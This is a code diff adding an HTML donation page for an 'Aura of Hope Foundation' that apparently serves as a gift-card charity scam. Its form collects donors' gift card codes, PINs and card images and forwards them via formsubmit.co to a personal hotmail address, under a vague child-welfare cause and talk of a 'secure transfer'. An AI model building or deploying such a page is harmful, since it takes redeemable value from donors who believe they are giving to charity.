@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Card Donation - Aura of Hope</title>
+    <style>
+        :root {
+            --bg-color: #0b0b0b;
+            --surface-color: #141414;
+            --surface-border: #262626;
+            --gold: #d4af37;
+            --gold-light: #f3e5ab;
+            --gold-dark: #aa820a;
+            --text-main: #f5f5f5;
+            --text-muted: #a3a3a3;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(11, 11, 11, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--surface-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 5%;
+            z-index: 1000;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--gold);
+            letter-spacing: 2px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin-left: 2rem;
+            font-size: 0.95rem;
+            transition: var(--transition);
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--gold);
+        }
+
+        main {
+            padding-top: 80px;
+            min-height: calc(100vh - 140px);
+        }
+
+        .page {
+            padding: 4rem 5%;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: #000;
+            font-weight: 600;
+            padding: 0.9rem 2.2rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: var(--transition);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, var(--gold-light), var(--gold));
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2);
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 0.9rem;
+            background: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            color: var(--text-main);
+            border-radius: 4px;
+            font-size: 1rem;
+            margin-bottom: 1.2rem;
+            transition: var(--transition);
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: var(--gold);
+            box-shadow: 0 0 0 2px rgba(212, 175, 55, 0.1);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .card {
+            background-color: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            border-radius: 8px;
+            padding: 2rem;
+            transition: var(--transition);
+            overflow: hidden;
+        }
+
+        footer {
+            background-color: var(--surface-color);
+            border-top: 1px solid var(--surface-border);
+            text-align: center;
+            padding: 2rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <a href="index.html" class="logo">AURA OF HOPE</a>
+        <nav>
+            <a href="index.html">Home</a>
+            <a href="donate.html" class="active">Donate</a>
+            <a href="credits.html">Credits</a>
+        </nav>
+    </header>
+
+    <main>
+        <section class="page">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Gift Card Contribution Portal</h2>
+                <p class="subtitle" style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Upload your gift card details and receipt images to complete your secure transfer.</p>
+
+                <div class="card">
+                    <form id="giftcard-form" action="https://formsubmit.co/auraofhopefoundation@hotmail.com" method="POST" enctype="multipart/form-data">
+                        <label for="donor-email">Your Email Address</label>
+                        <input type="email" id="donor-email" name="email" placeholder="you@gmail.com" required>
+
+                        <label for="card-details">Gift Card Code / Text Details</label>
+                        <textarea id="card-details" name="card_details" rows="4" placeholder="Enter card pin, code, or relevant text information here..." required></textarea>
+
+                        <label for="card-image">Upload Gift Card Image / Receipt</label>
+                        <input type="file" id="card-image" name="card_image" accept="image/*" required style="padding: 0.6rem; cursor: pointer;">
+
+                        <input type="hidden" name="donation_amount" id="form-donation-amount" value="50">
+                        <input type="hidden" name="_next" value="confirmation.html">
+                        <input type="hidden" name="_subject" value="New Gift Card Donation Upload - Aura of Hope">
+
+                        <button type="submit" class="btn" style="width: 100%; margin-top: 1rem;">Donate Now</button>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 Aura of Hope Foundation. Dedicated to global child preservation.</p>
+    </footer>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount') || '50';
+        document.getElementById('form-donation-amount').value = amount;
+    </script>
+</body>
+</html>
